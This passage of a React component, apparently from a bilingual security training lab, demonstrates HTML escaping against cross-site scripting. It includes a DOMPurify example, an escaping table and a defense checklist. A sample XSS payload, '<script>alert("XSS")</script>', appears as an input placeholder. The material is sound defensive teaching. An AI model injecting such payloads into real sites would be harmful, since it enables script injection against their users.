                                    <span className="comment">{'// DOMPurify library'}</span>{'\n'}
                                    <span className="keyword">import</span> DOMPurify <span className="keyword">from</span> <span className="string">'dompurify'</span>{'\n'}
                                    {'\n'}
                                    <span className="keyword">const</span> clean = <span className="function">DOMPurify.sanitize</span>(dirty, {'{'}{'\n'}
                                    {'  '}ALLOWED_TAGS: [<span className="string">'b'</span>, <span className="string">'i'</span>, <span className="string">'em'</span>, <span className="string">'a'</span>],{'\n'}
                                    {'  '}ALLOWED_ATTR: [<span className="string">'href'</span>]{'\n'}
                                    {'}'})
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Interactive: Escape demo */}
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            🔬 {lang === 'vi' ? 'Demo: Escape hoạt động' : 'Demo: How Escaping Works'}
                        </h3>
                        <div className="lab-input-group">
                            <label className="lab-input-label">
                                {lang === 'vi' ? 'Nhập HTML/XSS để xem cách escape' : 'Enter HTML/XSS to see how escaping works'}
                            </label>
                            <input className="lab-input" value={reflectedInput}
                                onChange={e => setReflectedInput(e.target.value)}
                                placeholder='<script>alert("XSS")</script>' />
                        </div>

                        {reflectedInput && (
                            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '0.5rem' }}>
                                <div>
                                    <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-red)', marginBottom: '0.3rem' }}>
                                        ❌ {lang === 'vi' ? 'TRƯỚC khi escape (raw)' : 'BEFORE escaping (raw)'}
                                    </div>
                                    <div className="lab-output error" style={{ fontSize: '0.78rem' }}>
                                        {reflectedInput}
                                    </div>
                                </div>
                                <div>
                                    <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--lab-green)', marginBottom: '0.3rem' }}>
                                        ✅ {lang === 'vi' ? 'SAU khi escape (safe)' : 'AFTER escaping (safe)'}
                                    </div>
                                    <div className="lab-output success" style={{ fontSize: '0.78rem' }}>
                                        {sanitizeHTML(reflectedInput)}
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Escape mapping table */}
                        <div style={{ marginTop: '1rem' }}>
                            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.82rem' }}>
                                <thead>
                                    <tr style={{ borderBottom: '1px solid var(--lab-border)' }}>
                                        <th style={{ padding: '0.5rem', textAlign: 'left', color: 'var(--lab-text-dim)', fontSize: '0.72rem', textTransform: 'uppercase' }}>
                                            {lang === 'vi' ? 'Ký tự' : 'Character'}
                                        </th>
                                        <th style={{ padding: '0.5rem', textAlign: 'left', color: 'var(--lab-text-dim)', fontSize: '0.72rem', textTransform: 'uppercase' }}>
                                            {lang === 'vi' ? 'Escape thành' : 'Escaped to'}
                                        </th>
                                        <th style={{ padding: '0.5rem', textAlign: 'left', color: 'var(--lab-text-dim)', fontSize: '0.72rem', textTransform: 'uppercase' }}>
                                            {lang === 'vi' ? 'Lý do' : 'Reason'}
                                        </th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {[
                                        { ch: '<', esc: '&lt;', reason: lang === 'vi' ? 'Ngăn mở HTML tag' : 'Prevents opening HTML tags' },
                                        { ch: '>', esc: '&gt;', reason: lang === 'vi' ? 'Ngăn đóng HTML tag' : 'Prevents closing HTML tags' },
                                        { ch: '"', esc: '&quot;', reason: lang === 'vi' ? 'Ngăn thoát attribute' : 'Prevents escaping attributes' },
                                        { ch: "'", esc: '&#x27;', reason: lang === 'vi' ? 'Ngăn thoát attribute' : 'Prevents escaping attributes' },
                                        { ch: '&', esc: '&amp;', reason: lang === 'vi' ? 'Ngăn entity injection' : 'Prevents entity injection' },
                                    ].map((row, i) => (
                                        <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                                            <td style={{ padding: '0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--lab-red)' }}>{row.ch}</td>
                                            <td style={{ padding: '0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--lab-green)' }}>{row.esc}</td>
                                            <td style={{ padding: '0.5rem', color: 'var(--lab-text-dim)' }}>{row.reason}</td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>
                    </div>

                    {/* Security checklist */}
                    <div className="lab-visual-panel">
                        <h3 className="lab-section-title">
                            ✅ {lang === 'vi' ? 'Checklist bảo mật XSS' : 'XSS Security Checklist'}
                        </h3>
                        <div style={{ display: 'grid', gap: '0.5rem' }}>
                            {[
                                { label: lang === 'vi' ? 'Escape tất cả user input trước khi render' : 'Escape all user input before rendering', done: true },
                                { label: lang === 'vi' ? 'Sử dụng framework tự escape (React, Vue, Angular)' : 'Use auto-escaping framework (React, Vue, Angular)', done: true },
                                { label: lang === 'vi' ? 'Cấu hình CSP headers' : 'Configure CSP headers', done: true },
                                { label: lang === 'vi' ? 'Set HttpOnly + Secure cho cookies' : 'Set HttpOnly + Secure on cookies', done: true },
                                { label: lang === 'vi' ? 'Validate input server-side' : 'Validate input server-side', done: true },
                                { label: lang === 'vi' ? 'Dùng DOMPurify cho rich HTML' : 'Use DOMPurify for rich HTML content', done: true },
                                { label: lang === 'vi' ? 'Không dùng innerHTML / dangerouslySetInnerHTML' : 'Avoid innerHTML / dangerouslySetInnerHTML', done: true },
                                { label: lang === 'vi' ? 'Kiểm tra URL scheme (chặn javascript:)' : 'Check URL schemes (block javascript:)', done: true },
                            ].map((item, i) => (
                                <div key={i} style={{
                                    display: 'flex', alignItems: 'center', gap: '0.6rem',
                                    padding: '0.5rem 0.8rem', borderRadius: 6,
                                    background: 'var(--lab-green-dim)',
                                    fontSize: '0.85rem', color: 'var(--lab-green)',
                                }}>
                                    <span style={{ fontSize: '1rem' }}>✅</span>
                                    {item.label}
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            )}
        </div>
    )
}
